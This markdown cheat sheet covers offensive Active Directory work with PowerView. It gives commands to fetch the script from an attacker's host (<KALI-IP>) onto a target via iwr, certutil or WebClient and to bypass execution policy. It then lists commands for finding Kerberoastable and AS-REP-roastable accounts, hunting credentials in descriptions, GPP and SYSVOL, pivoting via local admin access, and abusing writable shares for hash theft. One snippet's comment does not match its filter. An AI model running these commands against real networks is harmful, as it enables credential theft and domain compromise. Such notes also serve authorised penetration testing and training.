# PowerView
1. Install
 ```bash
    wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -O PowerView.ps1
   ````
2. Start local HTTP
 ```bash
 sudo python3 -m http.server 80
 ```
3. Transfer to Target
```powershell
iwr -Uri http://<KALI-IP>/PowerView.ps1 -OutFile PowerView.ps1  # Shortest command to download

certutil.exe -urlcache -f http://<KALI-IP>/PowerView.ps1 PowerView.ps1

# OR using WebClient (more compatible with older PS versions)
(New-Object System.Net.WebClient).DownloadFile('http://<KALI-IP>/PowerView.ps1', 'PowerView.ps1')
```
4. Load on target
```powershell
	powershell.exe -ExecutionPolicy Bypass
	. .\PowerView.ps1
	Get-NetUser
	Get-NetGroupMember -GroupName "Domain Admins"
	
   ```
   
## Kerberos Attacks (Roasting)
```powershell
# Find Kerberoastable users (users with an SPN set)
Get-NetUser -SPN | select samaccountname, serviceprincipalname

# Find ASREProastable users (users with preauth not required)
Get-NetUser -PreAuthNotRequired | select samaccountname, userprincipalname
```
## Credential Gathering and Discovery
```powershell
# Look for passwords in user’s description fields
Find-UserField -SearchField Description -SearchTerm "password"

# Look for credentials in GPOs (gpp_password, autologin)
Get-GPPPassword

# Check the DC’s SYSVOL SMB share for scripts containing credentials
Invoke-FileFinder -ShareType "SYSVOL" -IncludeExtension @("ps1", "vbs", "bat", "txt")

# Look for users with the PASSWD_NOTREQD field (Password Not Required)
Get-NetUser -Property @('samaccountname', 'useraccountcontrol') | 
    where {$_.useraccountcontrol -like '*DONT_EXPIRE_PASSWD*' -and 
           $_.useraccountcontrol -notlike '*LOCKOUT*'}
```
## Lateral Movement / Session Abuse
**NOTE: this is best performed by OTHER tools, like nxc,evilwinrm, etc..**
```powershell
# Try compromised local administrator hashes on other hosts
Find-LocalAdminAccess -Verbose | Select-Object -ExpandProperty ComputerName

# For each compromised user, spider through readable SMB shares for sensitive information
Invoke-ShareFinder -CheckShareAccess | Select-Object -ExpandProperty SharePath

# For each compromised user, conduct SMB Hash Theft attacks on writable SMB shares
Invoke-ShareFinder -CheckShareAccess -CheckWriteAccess | Select-Object -ExpandProperty SharePath

```
##  PowerView Top 15
   ```powershell
	# 1. Get current domain information
	Get-NetDomain
	
	# 2. Get forest information (to see other trusted domains)
	Get-NetForest
	
	# 3. List all domain controllers
	Get-NetDomainController
	
	# 4. List computers running a specific OS
	Get-NetComputer -OperatingSystem "Windows 10 Enterprise"
	
	# 5. Find shares (useful for lateral movement/exfiltration)
	Invoke-ShareFinder
	
	# 6. Find users with SPNs for Kerberoasting
	Get-NetUser -SPN | select samaccountname, serviceprincipalname
	
	# 7. List all groups
	Get-NetGroup
	
	# 8. Find all members of Domain Admins group (recursively)
	Get-DomainGroupMember -Identity "Domain Admins" -Recurse
	
	# 9. Find where users in high-privilege groups are logged in
	Invoke-UserHunter
	
	# 10. Check which machines you can immediately pivot to (Local Admin)
	Find-LocalAdminAccess -Verbose
	
	# 11. Review the password policy
	(Get-DomainPolicy)."System Access"
	
	# 12. List all domain trusts
	Get-NetDomainTrust
	
	# 13. Find GPOs that apply to the current user/machine
	Get-NetGPO -ComputerName $env:COMPUTERNAME
	
	# 14. Check for GPP passwords (critical legacy check)
	Get-GPPPassword
	
	# 15. General AD object query (e.g., finding Kerberos Delegation)
	Get-ADObject -LDAPFilter 'userAccountControl:1.2.840.113556.1.4.803:=524288'


   ```

